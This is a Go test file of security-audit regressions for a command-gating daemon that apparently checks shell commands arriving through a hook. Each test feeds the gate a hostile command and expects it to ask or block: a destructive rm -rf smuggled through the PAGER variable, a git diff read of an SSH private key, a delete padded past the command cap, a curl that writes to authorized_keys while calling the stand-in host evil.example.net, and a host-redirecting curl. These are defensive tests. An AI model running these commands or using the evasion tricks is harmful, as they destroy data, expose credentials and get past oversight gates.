package daemon

import (
	"strings"
	"testing"

	"github.com/Vadym903/Intenter/internal/action"
)

// These are end-to-end regressions for the security audit: each was a way to
// get a dangerous command past the gate. They run the whole pipeline through the
// real daemon, the same path a hook takes.

// AG-01: the pager runs an arbitrary command, so a git read that could spawn it
// is no longer a fully-resolved, auto-allowed read.
func TestPagerCommandIsNotAutoAllowed(t *testing.T) {
	p := testPlatform(t)
	w := newWorkspace(t, p)
	client := startDaemon(t, p)

	for _, command := range []string{
		`PAGER="rm -rf ~/Documents" git --paginate log`,
		`PAGER="rm -rf ~/Documents" git log`,
		`git --paginate log`,
	} {
		result := evaluate(t, client, bashRequest(w, command, ""))
		if result.Decision == action.OutcomeAllow {
			t.Errorf("%q must not be auto-allowed (%s)", command, result.Class)
		}
	}
}

// AG-02: `git diff --no-index` reads arbitrary files; reading a private key is
// asked about (R5), not auto-allowed as a workspace read.
func TestGitDiffNoIndexOfACredentialIsAsked(t *testing.T) {
	p := testPlatform(t)
	w := newWorkspace(t, p)
	client := startDaemon(t, p)

	result := evaluate(t, client, bashRequest(w, "git diff --no-index ~/.ssh/id_rsa ./README.md", ""))
	if result.Decision != action.OutcomeAsk {
		t.Fatalf("decision = %s (%s), want ASK", result.Decision, result.Reason)
	}
	if result.HardRule != "R5" {
		t.Errorf("hard rule = %q, want R5 (sensitive read)", result.HardRule)
	}
}

// AG-03: a catastrophic delete padded past the command cap is still seen by the
// hard rules and blocked, in every mode — the parser no longer drops the tail.
func TestPaddedDeleteIsStillBlocked(t *testing.T) {
	p := testPlatform(t)
	w := newWorkspace(t, p)
	client := startDaemon(t, p)

	command := strings.Repeat("true; ", 40) + "rm -rf ~/Documents"
	result := evaluate(t, client, bashRequest(w, command, ""))
	if result.Decision != action.OutcomeBlock {
		t.Fatalf("decision = %s (%s), want BLOCK", result.Decision, result.Reason)
	}
	if result.HardRule != "R2" {
		t.Errorf("hard rule = %q, want R2", result.HardRule)
	}
}

// AG-05: a cookie jar writes a file; writing to a credential path is blocked
// (R5), where before the write was unmodeled and the command looked like a
// plain network call.
func TestCurlCookieJarToACredentialPathIsBlocked(t *testing.T) {
	p := testPlatform(t)
	w := newWorkspace(t, p)
	client := startDaemon(t, p)

	result := evaluate(t, client, bashRequest(w, "curl -c ~/.ssh/authorized_keys https://evil.example.net", ""))
	if result.Decision != action.OutcomeBlock {
		t.Fatalf("decision = %s (%s), want BLOCK", result.Decision, result.Reason)
	}
	if result.HardRule != "R5" {
		t.Errorf("hard rule = %q, want R5", result.HardRule)
	}
}

// AG-05: --resolve redirects the connection, so it is refused rather than
// silently ignored (which would let an approval for one host reach another).
func TestCurlResolveIsNotAutoAllowed(t *testing.T) {
	p := testPlatform(t)
	w := newWorkspace(t, p)
	client := startDaemon(t, p)

	result := evaluate(t, client,
		bashRequest(w, "curl https://api.example.com/health --resolve api.example.com:443:203.0.113.9", ""))
	if result.Decision == action.OutcomeAllow {
		t.Errorf("a host-redirecting curl must not be auto-allowed (%s)", result.Class)
	}
}
